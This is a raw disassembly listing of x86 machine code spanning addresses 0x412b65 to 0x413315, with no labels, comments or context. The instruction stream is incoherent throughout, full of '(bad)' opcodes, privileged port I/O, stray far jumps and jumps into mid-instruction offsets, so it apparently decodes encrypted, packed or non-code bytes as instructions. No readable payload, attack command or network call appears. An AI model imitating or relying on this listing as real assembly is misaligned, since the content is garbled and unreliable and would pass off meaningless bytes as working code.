  412b65:	(bad)  
  412b66:	out    0x83,eax
  412b68:	add    BYTE PTR [ebp+0x67edb24f],al
  412b6e:	mov    esi,0xc9c55585
  412b73:	mov    BYTE PTR [ecx],al
  412b75:	push   ss
  412b76:	or     BYTE PTR [edx],cl
  412b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b79:	sub    DWORD PTR [ecx-0xa],ebp
  412b7c:	mov    al,0x32
  412b7e:	dec    ebp
  412b7f:	xor    eax,esp
  412b81:	mov    ch,0x54
  412b83:	lahf   
  412b84:	push   0x35
  412b86:	stc    
  412b87:	lds    ebx,FWORD PTR [eax+0x473ccae3]
  412b8d:	imul   ebx,DWORD PTR [ebx-0x520de176],0xffffffae
  412b94:	jge    0x412bf6
  412b96:	xor    eax,0x71cdebef
  412b9b:	mov    eax,ds:0x17dfd455
  412ba0:	push   edx
  412ba1:	fimul  WORD PTR [ecx-0x5c]
  412ba4:	shl    BYTE PTR [edx+0x7b32c59f],0x0
  412bab:	lock xchg BYTE PTR [esi+0x7a],dh
  412baf:	mov    ebp,0x5ede1fb9
  412bb4:	push   es
  412bb5:	pusha  
  412bb6:	cmp    cl,dl
  412bb8:	inc    esi
  412bb9:	jmp    0x412c1a
  412bbb:	xchg   esi,eax
  412bbc:	iret   
  412bbd:	push   ecx
  412bbe:	bound  esi,QWORD PTR ds:0x415dc50a
  412bc4:	push   edi
  412bc5:	adc    DWORD PTR [edx-0x42],ebp
  412bc8:	push   esp
  412bc9:	into   
  412bca:	mov    ds:0x7dca89a5,eax
  412bcf:	scas   al,BYTE PTR es:[edi]
  412bd0:	add    al,0xac
  412bd2:	lods   al,BYTE PTR ds:[esi]
  412bd3:	out    0xd,al
  412bd5:	mov    edi,0x409612ab
  412bda:	sub    ebp,DWORD PTR [esi]
  412bdc:	fnstcw WORD PTR [edx]
  412bde:	retf   0x7243
  412be1:	mov    al,ds:0x31bbadce
  412be6:	xchg   ebp,eax
  412be7:	(bad)  
  412be8:	ret    0xb4f0
  412beb:	or     BYTE PTR [ebx-0xa],0xfc
  412bef:	pop    ecx
  412bf0:	retf   0x4704
  412bf3:	cdq    
  412bf4:	mov    ecx,0x4533039f
  412bf9:	sti    
  412bfa:	xchg   ebx,eax
  412bfb:	fdiv   DWORD PTR [ebp-0x27]
  412bfe:	ins    DWORD PTR es:[edi],dx
  412bff:	iret   
  412c00:	in     eax,dx
  412c01:	add    BYTE PTR [ebp+0x77199c42],dh
  412c07:	mov    dl,0xa6
  412c09:	sbb    ebp,edi
  412c0b:	mov    ecx,0x7551c17f
  412c10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c11:	(bad)  
  412c12:	push   DWORD PTR [edi-0x11]
  412c15:	shr    DWORD PTR [ebx],cl
  412c17:	aaa    
  412c18:	pop    esi
  412c19:	loopne 0x412baf
  412c1b:	pop    ss
  412c1c:	fnstsw WORD PTR [ecx-0x29]
  412c1f:	scas   al,BYTE PTR es:[edi]
  412c20:	mov    ecx,0xdd16c0d7
  412c25:	cld    
  412c26:	in     al,0x90
  412c28:	pusha  
  412c29:	je     0x412c86
  412c2b:	lods   al,BYTE PTR ds:[esi]
  412c2c:	imul   edx,DWORD PTR ds:0x46dc0c2a,0xcdb8dffb
  412c36:	push   0x1a
  412c38:	mov    bl,0x8e
  412c3a:	sub    dl,BYTE PTR [eax-0x21]
  412c3d:	jp     0x412c5a
  412c3f:	bound  eax,QWORD PTR [ebp+0x8]
  412c42:	mov    ecx,0x101031d
  412c47:	out    0xe6,eax
  412c49:	jae    0x412c32
  412c4b:	sub    ebx,DWORD PTR [eax]
  412c4d:	pop    ds
  412c4e:	loop   0x412c01
  412c50:	xchg   esi,eax
  412c51:	dec    esp
  412c52:	sbb    BYTE PTR [ebx+0x5cca28e8],0xf8
  412c59:	clc    
  412c5a:	shl    DWORD PTR [ecx-0x14],cl
  412c5d:	into   
  412c5e:	inc    ebp
  412c5f:	cmp    BYTE PTR [edi-0x6f],0x1f
  412c63:	aaa    
  412c64:	fist   WORD PTR [ebx+0x2f]
  412c67:	fcom   QWORD PTR [edi]
  412c69:	lods   eax,DWORD PTR ds:[esi]
  412c6a:	jl     0x412bfa
  412c6c:	cmp    ah,BYTE PTR [ebp+0x1becb706]
  412c72:	xor    DWORD PTR [eax-0x14e36101],ecx
  412c78:	in     eax,0x3e
  412c7a:	mov    ecx,0x7baea0a7
  412c7f:	sbb    eax,0xffb5c8c3
  412c84:	enter  0xf15d,0x29
  412c88:	xchg   ebp,eax
  412c89:	xor    esi,DWORD PTR [eax+0x1]
  412c8c:	push   edi
  412c8d:	or     dh,BYTE PTR [esi+0x1b]
  412c90:	or     al,0x1a
  412c92:	cs fs nop
  412c95:	xchg   esi,eax
  412c96:	mov    ah,0xb9
  412c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c99:	cmp    BYTE PTR [eax+0x31],cl
  412c9c:	je     0x412c5d
  412c9e:	mov    al,ds:0x34a4aee4
  412ca3:	or     dl,BYTE PTR ds:0xa57fe5ef
  412ca9:	mov    al,0x8c
  412cab:	adc    ebp,DWORD PTR [eax-0x51e7bc6f]
  412cb1:	fbld   TBYTE PTR [edx]
  412cb3:	pop    esp
  412cb4:	jge    0x412c58
  412cb6:	xchg   ebx,eax
  412cb7:	dec    eax
  412cb8:	iret   
  412cb9:	jo     0x412d21
  412cbb:	fsubr  QWORD PTR [edx+ecx*2+0x74]
  412cbf:	add    al,0x4b
  412cc1:	(bad)  
  412cc2:	in     eax,0xb9
  412cc4:	fsubr  DWORD PTR [esi-0xc2e4016]
  412cca:	jmp    0x535d:0xd718
  412cd0:	out    dx,al
  412cd1:	test   eax,0x66a29bc1
  412cd6:	pop    esp
  412cd7:	dec    edi
  412cd8:	push   ebp
  412cd9:	das    
  412cda:	div    DWORD PTR [edi-0x7a]
  412cdd:	ret    0x12d7
  412ce0:	pop    es
  412ce1:	enter  0x137b,0x37
  412ce5:	add    BYTE PTR [edi],cl
  412ce7:	jg     0x412c81
  412ce9:	int3   
  412cea:	rcl    BYTE PTR fs:[edi+0x5f89aa31],1
  412cf1:	jg     0x412d3a
  412cf3:	mov    eax,DWORD PTR [eax]
  412cf5:	bnd jae 0x412d57
  412cf8:	inc    ebx
  412cf9:	mov    fs,WORD PTR [edx]
  412cfb:	mov    dl,0x94
  412cfd:	popa   
  412cfe:	sub    bl,al
  412d00:	bnd je 0x412d00
  412d03:	inc    esp
  412d04:	(bad)  
  412d05:	gs stc 
  412d07:	jnp    0x412d86
  412d09:	xchg   esi,eax
  412d0a:	jecxz  0x412d25
  412d0c:	(bad)  
  412d0d:	pop    eax
  412d0e:	stos   BYTE PTR es:[edi],al
  412d0f:	inc    edi
  412d10:	out    0x52,al
  412d12:	cmp    esp,ecx
  412d14:	inc    ebp
  412d15:	add    DWORD PTR [edi],esi
  412d17:	imul   eax,DWORD PTR [esi+0x22080c4a],0xffffffe2
  412d1e:	pop    ebp
  412d1f:	jbe    0x412d00
  412d21:	(bad)  
  412d23:	and    cl,ch
  412d25:	sbb    al,0xd1
  412d27:	xor    eax,0x37e6d588
  412d2c:	jnp    0x412dad
  412d2e:	fiadd  DWORD PTR [ecx-0x1710b5c5]
  412d34:	call   0x3cfe784f
  412d39:	cmp    eax,0x4f2a8c3d
  412d3e:	popf   
  412d3f:	lea    edx,ds:0xe54c25d7
  412d45:	jp     0x412d45
  412d47:	adc    BYTE PTR [esi],cl
  412d49:	fild   WORD PTR ds:0x25340257
  412d4f:	hlt    
  412d50:	jge    0x412dd0
  412d52:	jl     0x412d39
  412d54:	jno    0x412d20
  412d56:	outs   dx,BYTE PTR ds:[esi]
  412d57:	mov    dl,0x75
  412d59:	push   es
  412d5a:	retf   0x3787
  412d5d:	mov    WORD PTR [edi-0xe4d2748],cs
  412d63:	(bad)  [edx+0x17a23c38]
  412d69:	mov    ch,0x7b
  412d6b:	loop   0x412d5b
  412d6d:	adc    DWORD PTR [esi],edi
  412d6f:	mov    cl,BYTE PTR [ebp+0x8f3de3f]
  412d75:	psubsw mm6,QWORD PTR [eax+edi*2-0x1]
  412d7a:	mov    esi,0xfcd25271
  412d7f:	or     al,0x64
  412d81:	arpl   WORD PTR [ecx],si
  412d83:	cmc    
  412d84:	mov    esp,0x56ea7885
  412d89:	and    bh,ah
  412d8b:	(bad)  
  412d8c:	sub    DWORD PTR [ecx],edi
  412d8e:	(bad)  
  412d8f:	xor    ch,BYTE PTR [edi-0x20]
  412d92:	inc    edi
  412d93:	jns    0x412d73
  412d95:	and    eax,0x42047707
  412d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d9b:	adc    BYTE PTR [edx],dh
  412d9d:	sub    dl,bl
  412d9f:	lsl    esp,WORD PTR [ecx+0x22738c92]
  412da6:	and    al,0x60
  412da8:	scas   eax,DWORD PTR es:[edi]
  412da9:	int    0xce
  412dab:	(bad)  
  412dac:	retf   0xde38
  412daf:	iret   
  412db0:	sbb    ebp,DWORD PTR [esi]
  412db2:	adc    DWORD PTR [eax+0x52],esi
  412db5:	add    al,0x1b
  412db7:	repz cmp edi,esi
  412dba:	stos   BYTE PTR es:[edi],al
  412dbb:	push   esp
  412dbc:	sbb    eax,0xf7940f4a
  412dc1:	aaa    
  412dc2:	pushf  
  412dc3:	test   al,0x64
  412dc5:	dec    esp
  412dc6:	lods   al,BYTE PTR ds:[esi]
  412dc7:	test   al,0xd2
  412dc9:	call   0x40d9:0x908755e0
  412dd0:	mov    ah,0xf1
  412dd2:	fnstsw WORD PTR [ebx]
  412dd4:	mov    al,ds:0xecd1ddb7
  412dd9:	or     eax,0x1c33cb98
  412dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ddf:	popa   
  412de0:	(bad)  
  412de1:	int    0x4d
  412de3:	dec    ebx
  412de4:	pop    ebx
  412de5:	or     ah,BYTE PTR [edi]
  412de7:	or     ebp,DWORD PTR [eax]
  412de9:	ss retf 0x944d
  412ded:	scas   al,BYTE PTR es:[edi]
  412dee:	jmp    0x412e68
  412df0:	xor    DWORD PTR [ebp+0x6de76a9],edi
  412df6:	or     BYTE PTR [esi-0x11a748ab],0x21
  412dfd:	xor    BYTE PTR [esi+0x42],bh
  412e00:	jae    0x412d92
  412e02:	icebp  
  412e03:	jge    0x412da6
  412e05:	scas   eax,DWORD PTR es:[edi]
  412e06:	push   es
  412e07:	popa   
  412e08:	cs js  0x412e5c
  412e0b:	add    DWORD PTR [edx+0x4630d8ed],ebx
  412e11:	mov    esi,0xa2ab01e8
  412e16:	xchg   esp,eax
  412e17:	jno    0x412dc8
  412e19:	mov    bh,0xc4
  412e1b:	hlt    
  412e1c:	add    esi,DWORD PTR [ebx-0x606349d8]
  412e22:	cdq    
  412e23:	imul   ecx,DWORD PTR [edx+0x546cc116],0x8
  412e2a:	xor    eax,DWORD PTR [ecx]
  412e2c:	add    al,0x59
  412e2e:	stc    
  412e2f:	mov    esi,DWORD PTR [edi+0x73adb29e]
  412e35:	push   cs
  412e36:	frstor [edi-0x43355fed]
  412e3c:	leave  
  412e3d:	sub    ecx,edi
  412e3f:	fisubr DWORD PTR [eax+0x59]
  412e42:	pop    ebp
  412e43:	jnp    0x412e57
  412e45:	add    al,0x1
  412e47:	into   
  412e48:	xchg   edi,eax
  412e49:	jecxz  0x412e3a
  412e4b:	arpl   WORD PTR [ebx-0x40],dx
  412e4e:	rcl    ecx,1
  412e50:	jnp    0x412e10
  412e52:	aaa    
  412e53:	adc    DWORD PTR [ebp+0xa45abfc],eax
  412e59:	stc    
  412e5a:	clc    
  412e5b:	sbb    BYTE PTR [edi-0xa3eb5e8],dh
  412e61:	lods   al,BYTE PTR ds:[esi]
  412e62:	cld    
  412e63:	fwait
  412e64:	pop    ebx
  412e65:	xlat   BYTE PTR ds:[ebx]
  412e66:	into   
  412e67:	sbb    BYTE PTR [ebp-0x473078e8],0xa3
  412e6e:	scas   eax,DWORD PTR es:[edi]
  412e6f:	cmc    
  412e70:	jns    0x412e15
  412e72:	mov    al,ds:0xb1894e45
  412e77:	push   eax
  412e78:	je     0x412ec8
  412e7a:	sar    al,cl
  412e7c:	add    al,0x24
  412e7e:	stos   DWORD PTR es:[edi],eax
  412e7f:	fbld   TBYTE PTR [ebx+eiz*4-0x7b]
  412e83:	and    DWORD PTR [ebx+edx*8],ebx
  412e86:	jno    0x412e16
  412e88:	mov    cl,0xc2
  412e8a:	data16 (bad) 
  412e8c:	push   eax
  412e8d:	inc    ebp
  412e8e:	cmp    al,0x21
  412e90:	inc    esi
  412e91:	repnz scas eax,DWORD PTR es:[edi]
  412e93:	icebp  
  412e94:	aam    0xa5
  412e96:	lods   al,BYTE PTR ds:[esi]
  412e97:	adc    BYTE PTR [ebx],al
  412e99:	jbe    0x412e5f
  412e9b:	dec    esi
  412e9c:	bound  eax,QWORD PTR [ebp+0x40]
  412e9f:	ds jo  0x412e36
  412ea2:	int    0x98
  412ea4:	mov    ebp,0x63b0116e
  412ea9:	ja     0x412e88
  412eab:	or     eax,0x4854e675
  412eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eb1:	fcmovnb st,st(0)
  412eb3:	mov    bl,0x87
  412eb5:	mov    esi,0x74080d52
  412eba:	xlat   BYTE PTR ds:[ebx]
  412ebb:	out    0x74,eax
  412ebd:	mov    eax,ds:0x982c7fbe
  412ec2:	das    
  412ec3:	iret   
  412ec4:	and    eax,0x1c755787
  412ec9:	ficom  DWORD PTR [ecx+eiz*8+0x55d8aa5d]
  412ed0:	dec    esp
  412ed1:	cmp    esp,edx
  412ed3:	jmp    0x245dabbe
  412ed8:	xchg   ebp,eax
  412ed9:	fisub  DWORD PTR [edx+eax*2-0x19e3bbdc]
  412ee0:	pop    esi
  412ee1:	mov    gs,WORD PTR [ebp+0xd]
  412ee4:	jmp    0xbfd8b9cc
  412ee9:	or     al,BYTE PTR [esi]
  412eeb:	push   esp
  412eec:	mov    edx,0x2965a64f
  412ef1:	ret    
  412ef2:	shl    ebx,1
  412ef4:	retf   0x984a
  412ef7:	jmp    0xad78:0x7d0b7fa1
  412efe:	int3   
  412eff:	mov    cl,BYTE PTR [edx-0x7]
  412f02:	dec    ecx
  412f03:	bnd jno 0x412f72
  412f06:	mov    ds:0x5ebf5b1f,al
  412f0b:	(bad)  
  412f0c:	lds    esp,FWORD PTR [eax]
  412f0e:	test   al,0x65
  412f10:	sti    
  412f11:	pop    ds
  412f12:	cmp    eax,0x145cab32
  412f17:	cmp    BYTE PTR [ebx],0xf1
  412f1a:	aam    0x7b
  412f1c:	pop    edi
  412f1d:	aaa    
  412f1e:	cwde   
  412f1f:	mov    ch,0x63
  412f21:	push   0xc30c322e
  412f26:	inc    edx
  412f27:	xchg   edi,eax
  412f28:	xor    al,0xbb
  412f2a:	ins    BYTE PTR es:[edi],dx
  412f2b:	dec    edx
  412f2c:	adc    bh,BYTE PTR [ebx-0x28]
  412f2f:	xor    cl,BYTE PTR ds:0xc2e78a0a
  412f35:	mov    al,ds:0xc411a46d
  412f3a:	cmp    BYTE PTR [eax],dh
  412f3c:	leave  
  412f3d:	sub    eax,0xfcb99cd
  412f42:	retf   
  412f43:	mov    BYTE PTR [ecx+0xbeb17b1],cl
  412f49:	cmp    al,dh
  412f4b:	es hlt 
  412f4d:	push   0x4a
  412f4f:	sbb    eax,0x705b4c7
  412f54:	cmp    al,0x52
  412f56:	cmp    esp,ecx
  412f58:	pop    ss
  412f59:	hlt    
  412f5a:	mov    eax,ds:0x6e051cdb
  412f5f:	sbb    eax,ecx
  412f61:	dec    edi
  412f62:	xor    bh,cl
  412f64:	int    0x48
  412f66:	fwait
  412f67:	sar    BYTE PTR [ebx],1
  412f69:	xor    ch,BYTE PTR fs:[ebp-0x57d594c9]
  412f70:	retf   0xa6c0
  412f73:	sbb    bh,BYTE PTR [ebp+0x59cb1a65]
  412f79:	cdq    
  412f7a:	add    bl,BYTE PTR [edi-0x783d988]
  412f80:	dec    ebx
  412f81:	sbb    edi,DWORD PTR [ebp-0x2b09893e]
  412f87:	out    dx,al
  412f88:	mov    edi,DWORD PTR [ecx+edi*2]
  412f8b:	jle    0x412f14
  412f8d:	adc    ebx,DWORD PTR [edx-0x4b]
  412f90:	dec    DWORD PTR [edi]
  412f92:	(bad)  
  412f93:	pop    edx
  412f94:	int    0xb
  412f96:	js     0x412fd4
  412f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f99:	push   edi
  412f9a:	push   ds
  412f9b:	jnp    0x412f6d
  412f9d:	lea    ecx,[ebx+0x2b3f04b7]
  412fa3:	inc    esp
  412fa4:	add    DWORD PTR [esi+0x3e119d04],0x5
  412fab:	pusha  
  412fac:	cwde   
  412fad:	ss dec esp
  412faf:	adc    ecx,ebp
  412fb1:	dec    eax
  412fb2:	dec    edx
  412fb3:	fwait
  412fb4:	adc    bh,BYTE PTR ds:0xae279a13
  412fba:	cdq    
  412fbb:	imul   edi,esp,0x4224d2d3
  412fc1:	(bad)  
  412fc2:	test   eax,0x5ed4df13
  412fc7:	fisub  WORD PTR [ecx]
  412fc9:	dec    esp
  412fca:	pop    ecx
  412fcb:	sahf   
  412fcc:	popa   
  412fcd:	jle    0x412fb9
  412fcf:	mov    al,0x70
  412fd1:	sub    al,cl
  412fd3:	cwde   
  412fd4:	inc    ebp
  412fd5:	dec    edi
  412fd6:	xor    eax,0x2d2fc33d
  412fdb:	mov    bh,BYTE PTR [ecx]
  412fdd:	pop    esi
  412fde:	add    eax,0x2d6ac706
  412fe3:	mov    eax,0xf07b67f
  412fe8:	mov    cl,0xd1
  412fea:	fld    QWORD PTR [esi-0x2f427774]
  412ff0:	push   ecx
  412ff1:	cmp    cl,dl
  412ff3:	js     0x412fe8
  412ff5:	mov    ds:0x2e8cf702,al
  412ffa:	shl    DWORD PTR [esi-0x6c],cl
  412ffd:	fmul   DWORD PTR [ecx-0x1328ca59]
  413003:	out    0x59,al
  413005:	inc    ecx
  413006:	or     eax,0x1a3b6e83
  41300b:	(bad)  [eax-0x6]
  41300e:	retf   0x52e6
  413011:	jge    0x413083
  413013:	sbb    al,0xb7
  413015:	into   
  413016:	cwde   
  413017:	sub    DWORD PTR [eax],ebp
  413019:	fwait
  41301a:	jo     0x41305d
  41301c:	das    
  41301d:	push   cs
  41301e:	fidivr DWORD PTR [ecx+0xf1e9bf6]
  413024:	inc    ebp
  413025:	outs   dx,DWORD PTR ds:[esi]
  413026:	mov    al,0x21
  413028:	xchg   ecx,eax
  413029:	pop    esp
  41302a:	pop    esi
  41302b:	adc    DWORD PTR [edx],0xffffff8d
  41302e:	mov    edx,0xc306761e
  413033:	dec    ebx
  413034:	lahf   
  413035:	mov    bh,0x75
  413037:	sahf   
  413038:	daa    
  413039:	push   ds
  41303a:	or     DWORD PTR ds:0xd6570918,edx
  413040:	call   0xf1bb:0xeff518aa
  413047:	(bad)  
  413048:	xlat   BYTE PTR ds:[ebx]
  413049:	mov    fs,WORD PTR [ebp-0x48123a28]
  41304f:	xchg   esi,eax
  413050:	sahf   
  413051:	mov    edi,0x985b13aa
  413056:	das    
  413057:	adc    BYTE PTR [eax+0x14],ch
  41305a:	retf   0xe98e
  41305d:	pop    edx
  41305e:	push   edi
  41305f:	scas   al,BYTE PTR es:[edi]
  413060:	cmp    BYTE PTR [ecx-0x6227ae38],dh
  413066:	jne    0x4130cc
  413068:	jp     0x413044
  41306a:	loopne 0x413069
  41306c:	mov    esi,0xbd399688
  413071:	pop    eax
  413072:	fs and al,0x4f
  413075:	sbb    BYTE PTR [ebx],bl
  413077:	ret    0xe01e
  41307a:	adc    DWORD PTR [ebx+0x37],ebx
  41307d:	lock sbb BYTE PTR [edi-0x5e80810d],0x7d
  413085:	or     al,BYTE PTR [edi]
  413087:	inc    ebp
  413088:	sar    DWORD PTR [ebx+0x53815bca],cl
  41308e:	mov    ds,WORD PTR ds:0x4f1bec92
  413094:	pop    ss
  413095:	out    dx,eax
  413096:	mov    ebp,0x9b01edbc
  41309b:	idiv   BYTE PTR [ecx+eiz*4+0x1f]
  41309f:	inc    edx
  4130a0:	push   es
  4130a1:	pop    eax
  4130a2:	push   ss
  4130a3:	lods   al,BYTE PTR ds:[esi]
  4130a4:	rcr    ebx,1
  4130a6:	ds mov ebp,0xaec1a3ac
  4130ac:	neg    BYTE PTR [esi]
  4130ae:	push   edi
  4130af:	push   cs
  4130b0:	xlat   BYTE PTR ds:[ebx]
  4130b1:	cmp    bl,BYTE PTR [edx]
  4130b3:	iret   
  4130b4:	imul   edx,DWORD PTR [ebp-0x7f9ea75e],0x4d
  4130bb:	hlt    
  4130bc:	(bad)  
  4130bd:	or     DWORD PTR [ecx+0x5a4cd2c7],edx
  4130c3:	push   edx
  4130c4:	jns    0x413072
  4130c6:	add    eax,0xa9a05cc6
  4130cb:	mov    DWORD PTR [esi-0x65735b36],0x7440e5d
  4130d5:	inc    esp
  4130d6:	adc    bl,bh
  4130d8:	ret    
  4130d9:	mov    bl,0xbf
  4130db:	jne    0x413079
  4130dd:	or     ch,BYTE PTR [ebp-0x421fbd0f]
  4130e3:	or     eax,0xb0a95149
  4130e8:	add    eax,ebx
  4130ea:	adc    bl,BYTE PTR [edi]
  4130ec:	adc    eax,0x4961d082
  4130f1:	mov    dl,0x86
  4130f3:	or     eax,0x6b789c7c
  4130f8:	aaa    
  4130f9:	inc    esp
  4130fa:	jae    0x4130ce
  4130fc:	dec    ebp
  4130fd:	pushf  
  4130fe:	jg     0x4130ac
  413100:	adc    al,dh
  413102:	repnz sub ecx,DWORD PTR [esi-0x13f0d7cb]
  413109:	fimul  DWORD PTR [edi+0x23]
  41310c:	test   eax,0xe0351d8c
  413111:	jae    0x4130fc
  413113:	mov    edx,0x1da65679
  413118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413119:	(bad)  
  41311a:	lods   eax,DWORD PTR ds:[esi]
  41311b:	xchg   esp,eax
  41311c:	addr16 mov ah,0x12
  41311f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413120:	and    ecx,esp
  413122:	adc    cl,ah
  413124:	push   esi
  413125:	push   edx
  413126:	mov    ah,0x1a
  413128:	bound  esi,QWORD PTR [ecx-0x5f]
  41312b:	and    BYTE PTR [esi-0x61],al
  41312e:	sbb    esp,edi
  413130:	pushf  
  413131:	sar    DWORD PTR ds:0xeb7def1e,0xa
  413138:	cli    
  413139:	adc    al,0xdf
  41313b:	cld    
  41313c:	xor    eax,0x14ab32de
  413141:	pop    esp
  413142:	xchg   ebx,eax
  413143:	ja     0x413131
  413145:	mov    DWORD PTR [edi-0x72],edi
  413148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413149:	pop    ds
  41314a:	cmp    BYTE PTR [esi],bl
  41314c:	push   0xffffffdb
  41314e:	outs   dx,DWORD PTR ds:[esi]
  41314f:	sub    DWORD PTR [esi+0x62],eax
  413152:	out    dx,eax
  413153:	cmp    BYTE PTR [ebx],bl
  413155:	push   ebp
  413156:	dec    edi
  413157:	iret   
  413158:	push   ds
  413159:	ja     0x4130ed
  41315b:	jecxz  0x4130dd
  41315d:	jl     0x4131af
  41315f:	or     ebx,ebx
  413161:	imul   ecx,DWORD PTR [eax+0x3b832af4],0x72
  413168:	xchg   esp,eax
  413169:	push   esp
  41316a:	pop    esp
  41316b:	add    DWORD PTR [ebx+edi*1],esi
  41316e:	mov    al,0xd6
  413170:	je     0x4131a3
  413172:	mov    eax,ds:0x44da19d5
  413177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413178:	and    BYTE PTR [edx+eiz*1],0x27
  41317c:	sbb    dl,bh
  41317e:	sub    eax,0x660c2b37
  413183:	fsubr  st(7),st
  413185:	cmp    al,BYTE PTR [eax-0x44d819c1]
  41318b:	mov    esp,esp
  41318d:	xlat   BYTE PTR ds:[ebx]
  41318e:	ins    BYTE PTR es:[edi],dx
  41318f:	call   0xda15ead6
  413194:	or     al,0x33
  413196:	xor    DWORD PTR [edi-0x2ee57af8],0x33
  41319d:	and    al,ch
  41319f:	mov    esi,0x15d81509
  4131a4:	repnz cmp eax,0x1625a5ac
  4131aa:	or     DWORD PTR [ecx+eiz*1+0x74],eax
  4131ae:	cli    
  4131af:	add    al,0x6c
  4131b1:	push   ebx
  4131b2:	lods   eax,DWORD PTR ds:[esi]
  4131b3:	mov    edx,0x1a2c4a44
  4131b8:	stos   BYTE PTR es:[edi],al
  4131b9:	pop    edi
  4131ba:	adc    ah,bl
  4131bc:	mov    ebx,0x53cafb3f
  4131c1:	sub    BYTE PTR [esi-0x8a885da],bl
  4131c7:	out    dx,eax
  4131c8:	push   0xffffffce
  4131ca:	stos   DWORD PTR es:[edi],eax
  4131cb:	cs sbb ebx,ecx
  4131ce:	xchg   ebp,eax
  4131cf:	out    0xee,eax
  4131d1:	and    eax,DWORD PTR [esi-0x6a]
  4131d4:	sar    ecx,0x85
  4131d7:	les    ebx,FWORD PTR [ecx+eiz*1+0xc293795]
  4131de:	jb     0x4131b8
  4131e0:	mov    ds:0x87691392,eax
  4131e5:	popf   
  4131e6:	test   DWORD PTR [esi],eax
  4131e8:	fwait
  4131e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ea:	pop    ds
  4131eb:	pop    esp
  4131ec:	fbstp  TBYTE PTR [ecx+ecx*4+0x4f85c00a]
  4131f3:	jecxz  0x41322a
  4131f5:	push   edi
  4131f6:	fisubr WORD PTR [edi-0x19]
  4131f9:	mov    cl,0x75
  4131fb:	fsub   DWORD PTR [ebp+0x4d]
  4131fe:	test   BYTE PTR [esi+0x4c61f3a2],bh
  413204:	jne    0x413221
  413206:	lds    ebx,FWORD PTR [edi-0x9]
  413209:	pusha  
  41320a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41320b:	sub    esp,eax
  41320d:	xchg   ebx,eax
  41320e:	in     eax,0x73
  413210:	and    BYTE PTR ds:0x75355dc9,ch
  413216:	test   DWORD PTR ds:0x7d62b5d,0x20844c98
  413220:	(bad)  
  413221:	cwde   
  413222:	jns    0x413248
  413224:	pop    eax
  413225:	mov    cl,0x5b
  413227:	rol    BYTE PTR [edi],0xa7
  41322a:	fcomp  QWORD PTR [edi+eiz*1+0x3f]
  41322e:	inc    ebx
  41322f:	inc    edi
  413230:	push   es
  413231:	loope  0x41325d
  413233:	aaa    
  413234:	cmp    edx,DWORD PTR [esi+0x270635c4]
  41323a:	push   eax
  41323b:	test   al,0x7e
  41323d:	dec    ebp
  41323e:	sub    eax,0xa7e0d7ab
  413243:	jo     0x4131c6
  413245:	push   0xe8ab2f4a
  41324a:	js     0x4132cb
  41324c:	pop    ebp
  41324d:	mov    ebx,0x5268afe
  413252:	and    DWORD PTR [ebx+0x5aa3a18d],0xffffff8d
  413259:	popf   
  41325a:	jne    0x4131e3
  41325c:	mov    ah,0xd6
  41325e:	adc    eax,0xe959dbe7
  413263:	ins    BYTE PTR es:[edi],dx
  413264:	je     0x413227
  413266:	mov    BYTE PTR [edx],dl
  413268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413269:	mov    ebp,0x1b334bb7
  41326e:	mov    BYTE PTR [ebx+0x459dea30],al
  413274:	test   DWORD PTR [edi+0x58],ebx
  413277:	mov    eax,ds:0x4a3ab43c
  41327c:	mov    BYTE PTR [ecx-0x4d],bh
  41327f:	pop    eax
  413280:	leave  
  413281:	jp     0x413207
  413283:	push   ecx
  413284:	repnz and DWORD PTR [ebp+0x7aa33a04],edx
  41328b:	stos   DWORD PTR es:[edi],eax
  41328c:	retf   0x9de9
  41328f:	(bad)  
  413290:	imul   ecx,DWORD PTR [esi+0x4],0x34
  413294:	cmp    esi,ebp
  413296:	(bad)  [esi]
  413298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413299:	cdq    
  41329a:	sub    edx,edx
  41329c:	mov    dh,BYTE PTR [esi+ecx*4-0x7843f1fc]
  4132a3:	and    esi,esi
  4132a5:	mov    ds:0x4b164eaa,al
  4132aa:	hlt    
  4132ab:	pop    es
  4132ac:	and    eax,0xf50aa8f8
  4132b1:	jnp    0x413278
  4132b3:	mov    ebp,DWORD PTR [ebx+0x6e8062f3]
  4132b9:	push   ss
  4132ba:	xor    BYTE PTR [esi+0x60],ch
  4132bd:	loope  0x4132ad
  4132bf:	sbb    dl,BYTE PTR [edx]
  4132c1:	lock pusha 
  4132c3:	mov    edx,0x499330ec
  4132c8:	mov    edi,0x1e1750c8
  4132cd:	retf   0x7741
  4132d0:	ins    DWORD PTR es:[edi],dx
  4132d1:	imul   esi,DWORD PTR [edx],0xb7876625
  4132d7:	sub    cl,BYTE PTR [eax+0x53b27ad0]
  4132dd:	or     ch,BYTE PTR [eax+0xdae3eb0]
  4132e3:	inc    edi
  4132e4:	jae    0x4132a1
  4132e6:	inc    esp
  4132e7:	jl     0x4132d0
  4132e9:	sub    al,0x1b
  4132eb:	push   esi
  4132ec:	das    
  4132ed:	xor    eax,0x73331f3f
  4132f2:	jb     0x413303
  4132f4:	push   cs
  4132f5:	push   cs
  4132f6:	rol    BYTE PTR [edi-0x7d],cl
  4132f9:	mov    ah,0x6
  4132fb:	clc    
  4132fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132fd:	ret    
  4132fe:	mov    cl,BYTE PTR ds:0x1a80f1d9
  413304:	sub    ecx,esi
  413306:	dec    esi
  413307:	or     BYTE PTR [edi-0x45],al
  41330a:	into   
  41330b:	xchg   ebx,eax
  41330c:	dec    esi
  41330d:	pop    ds
  41330e:	fsub   DWORD PTR [esi]
  413310:	push   ecx
  413311:	cmc    
  413312:	dec    eax
  413313:	jg     0x41333e
  413315:	cwde   
